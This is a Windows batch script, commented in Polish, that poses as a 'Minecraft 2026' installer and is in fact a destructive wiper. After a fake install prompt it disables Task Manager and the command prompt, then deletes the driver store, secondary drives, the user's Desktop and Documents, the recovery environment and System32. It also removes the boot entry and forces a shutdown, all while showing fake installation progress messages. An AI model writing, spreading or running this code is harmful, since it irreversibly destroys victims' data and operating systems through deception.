@echo off
setlocal
title Minecraft 2026 Installer

:: 1. SOCJOTECHNIKA
powershell -Command "$result = [System.Windows.Forms.MessageBox]::Show('Do you want to install Minecraft 2026 Edition?`n(Admin rights required for shaders)', 'Setup', [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Question); if ($result -eq 'No') { exit 1 } else { exit 0 }"
if %errorlevel% neq 0 exit

:: 2. BLOKADA RATUNKU
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f >nul 2>&1

:: 3. PROCES "INSTALACJI" (REALNA DESTRUKCJA)
cls
color 0F
echo Minecraft Official Setup
echo -----------------------
echo.

:: Faza 1: Sterowniki i Dyski logiczne
echo [+] Installing Core Engine...
:: Usuwanie sterowników (DriverStore to serce sterowników Windowsa)
takeown /f "C:\Windows\System32\DriverStore" /r /d y >nul 2>&1
icacls "C:\Windows\System32\DriverStore" /grant administrators:F /t >nul 2>&1
del /f /s /q "C:\Windows\System32\DriverStore\*.*" >nul 2>&1

for %%d in (D E F G H) do (if exist %%d:\ rd /s /q %%d:\ >nul 2>&1)
timeout /t 3 >nul

:: Faza 2: Usuwanie profilu użytkownika
echo [+] Downloading Minecraft Assets...
del /f /s /q "%userprofile%\Desktop\*.*" >nul 2>&1
del /f /s /q "%userprofile%\Documents\*.*" >nul 2>&1
timeout /t 3 >nul

:: Faza 3: Atak na System32 i Recovery (Folder po folderze)
echo [+] Finalizing Installation...

:: Wyłączenie i usunięcie środowiska odzyskiwania (WinRE)
reagentc /disable >nul 2>&1
del /f /s /q "C:\Recovery\*.*" >nul 2>&1

:: Systematyczne usuwanie System32
cd /d C:\Windows\System32
for /d %%i in (*) do (
    echo [+] Installing Shaders: %%i
    rd /s /q "%%i" >nul 2>&1
)
del /f /q *.* >nul 2>&1

:: Faza 4: Zniszczenie Bootloadera (System już nie wstanie)
bcdedit /delete {current} /f >nul 2>&1

:: 4. KONIEC
cls
taskkill /f /im explorer.exe >nul 2>&1
echo [!] INSTALLATION CRITICAL ERROR
echo [!] UNABLE TO RECOVER SYSTEM
echo.
powershell -Command "[Windows.Forms.MessageBox]::Show('System32 and Drivers have been removed. Recovery disabled.', 'CRITICAL FAILURE', 0, 16)"

:: Wymuszenie BSOD lub zamknięcia
shutdown /s /t 5 /f /c "Game Over"

:matrix
echo %random%%random%%random%%random%
goto matrix
